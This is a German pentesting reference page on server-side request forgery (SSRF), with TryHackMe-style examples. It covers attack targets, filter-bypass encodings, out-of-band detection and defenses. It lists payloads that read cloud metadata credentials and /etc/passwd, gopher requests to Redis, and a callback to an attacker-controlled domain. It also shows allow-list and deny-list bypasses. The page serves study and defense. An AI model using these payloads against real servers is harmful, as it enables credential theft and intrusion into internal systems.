---
description: Server wird zur internen Kommunikation missbraucht
---

# SSRF - server side request forgery — make servers attack themselves

<details>

<summary><strong>Tools &#x26; Quellen:</strong></summary>

[burp-suite.md](../../../programme-skripte/burp-suite.md "mention")

FFUF/SSRFmap/SSRFire

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

</details>

**Definition, Techniken, Erkennung und Missbrauchsmöglichkeiten**

**Server-Side Request Forgery (SSRF)** ist eine Sicherheitslücke, bei der ein Angreifer einen Server dazu bringt, interne oder externe HTTP-Anfragen zu generieren. Der Angreifer kontrolliert dabei ganz oder teilweise die Zieladresse (z. B. URL oder IP), wodurch interne Dienste, Metadaten-APIs oder nicht öffentliche Netzwerke abgefragt werden können. SSRF kann sowohl zu Informationslecks als auch zu Remote Code Execution oder weiteren Angriffen führen.

***

### **Ziel und Angriffsmöglichkeiten**

Bei einem SSRF-Angriff wird ein Server – z. B. durch manipulierte Parameter in einer URL – dazu gebracht, selbst HTTP-Anfragen an andere Systeme zu stellen. Dies kann ausgenutzt werden, um:

* interne Systeme zu scannen (`localhost`, `127.0.0.1`, `169.254.169.254`, etc.)
* sensible Metadaten aus Cloud-Umgebungen (z. B. AWS EC2) zu exfiltrieren
* nicht freigegebene APIs aufzurufen oder interne Admin-Panels zu erreichen
* Webhooks oder Callback-Mechanismen umzuleiten oder zu missbrauchen
* interne Dienste in Verbindung mit weiteren Schwachstellen zu kompromittieren (Pivoting)

***

### **Typische Angriffsparameter**

Ein SSRF-Vektor tritt häufig auf, wenn der Server Benutzer-Eingaben zur URL-Verarbeitung nutzt, z. B.:

```http
GET /fetch?url=http://example.com/image.jpg
```

Manipulation durch den Angreifer:

```http
/fetch?url=http://127.0.0.1:8080/admin
/fetch?url=http://169.254.169.254/latest/meta-data/
```

***

### **Interne Zielsysteme (typische Angriffsziele)**

| Zieladresse                     | Bedeutung                                 |
| ------------------------------- | ----------------------------------------- |
| `127.0.0.1` / `localhost`       | Zugriff auf lokale Services               |
| `169.254.169.254`               | Cloud-Metadaten (z. B. AWS, Azure)        |
| `internal-service.local`        | Interne DNS-Einträge                      |
| `http://localhost:3000/metrics` | Prometheus, Admin Panels                  |
| `http://redis:6379/`            | Versuch direkter Interaktion mit Diensten |

***

### **Straightforward Beispiele (Testfälle)**

#### **Zugriff auf interne HTTP-Services**

```http
/fetch?url=http://127.0.0.1:80
/fetch?url=http://localhost:8000/admin
```

#### **Cloud Metadaten abfragen (z. B. AWS)**

```http
/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
/fetch?url=http://169.254.169.254/latest/user-data
```

***

### **Umgehung von Filtermechanismen (WAF Bypasses)**

#### **IP-Kodierungen**

| Eingabeform         | Bedeutung                     |
| ------------------- | ----------------------------- |
| `http://2130706433` | Dezimale Form von `127.0.0.1` |
| `http://0x7f000001` | Hexadezimal                   |
| `http://0177.0.0.1` | Oktalnotation                 |
| `http://127.0.1`    | Verkürzte Notation            |

#### **Protokollvarianten**

```http
/fetch?url=gopher://127.0.0.1:6379/_PING
/fetch?url=file:///etc/passwd
/fetch?url=ftp://127.0.0.1/resource
```

***

### **Exploits mit Out-of-Band (OOB) Verifikation**

#### **Externe Interaktionen zur Bestätigung**

```http
/fetch?url=http://<attacker-controlled-domain>/log
```

Verwendung eines DNS-Logging-Tools (z. B. `Burp Collaborator`, `dnslog.cn`) ermöglicht die Bestätigung der erfolgreichen SSRF-Anfrage durch Abruf der externen Domain.

***

### **Erkennung von SSRF über Zeitverhalten (Time Delay)**

Einige Server lassen sich durch Verzögerung in der Antwortzeit auf anfällige interne Services testen, etwa:

```http
/fetch?url=http://127.0.0.1:1234 (Verzögerung = Dienst antwortet nicht)
```

***

### **Schutzmaßnahmen (für Entwickler & Admins)**

* Whitelisting von Zieladressen (z. B. nur erlaubte Domains zulassen)
* Auflösen und Validieren von IPs vor dem Verbindungsaufbau (DNS-Rebinding verhindern)
* Blockieren von internen IP-Ranges (`127.0.0.0/8`, `169.254.0.0/16`, `192.168.0.0/16`, etc.)
* Protokollbasiertes Filtern (nur `http`, `https` erlauben)
* Ausgehende Verbindungen auf Netzwerkebene einschränken (z. B. durch Firewall/Proxy)

***

### Bekannte Verteidigungen gegen SSRF

#### Deny List

Alle Anfragen werden akzeptiert. Ausnahmen werden innerhalb einer Deny-Liste definiert.

Dabei können sensible Endpoints, IP-Adressen oder Domänen gegen Zugriff von außerhalb geschützt werden. Beispielsweise sollte der localhost-Endpoint geschützt werden. Typische Einträge dafür sind "localhost" bzw. "127.0.0.1"

Der Zugriff auf localhost kann umgangen werden durch alternative Referenzen wie `0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001` oder Subdomains mit DNS-Record welcher auf IP-Adresse 127.0.0.1 auflöst.

Bei Cloud-Umgebungen sollte die IP-Adresse 169.254.169.254 blockiert werden, da sie Metadaten des Cloud-Servers inklusive ggf. sensibler Informationen enthalten können. Ein Angreifer könnte das umgehen, indem eine Subdomain mit eigenem DNS-Record erstellt wird, der auf diese IP-Adresse zeigt.

#### Allow List

Alle Anfragen werden abgelehnt. Ausnahmen werden innerhalb einer Allow-Liste definiert.

In der Liste werden Muster definiert, die bei einer Anfrage verwendet werden müssen. Beispielsweise dass eine Anfrage mit https://interne-website.xyz beginnen muss.

Die Regel kann umgangen werden indem auf Angreiferseite eine Subdomain mit der Domain erstellt wird. Für obere Anfrage könnte das wie folgt aussehen: https://**interne-website.xyz.**&#x68;ackersite.com

#### Open Redirect

Eine offene Weiterleitung ist ein Endpunkt auf dem Server, an dem der Website-Besucher automatisch zu einer anderen Website-Adresse weitergeleitet wird.

Nehmen wir zum Beispiel den Link https://website.thm/link?url=https://tryhackme.com. Dieser Endpunkt wurde eingerichtet, um die Anzahl der Besucher aufzuzeichnen, die zu Werbe-/Marketingzwecken auf diesen Link geklickt haben.

Aber stellen Sie sich vor, es gäbe eine potenzielle SSRF-Schwachstelle mit strengen Regeln, die nur URLs zulassen, die mit https://website.thm/ beginnen.

Ein Angreifer könnte die oben genannte Funktion nutzen, um die interne HTTP-Anfrage an eine Domäne seiner Wahl umzuleiten.
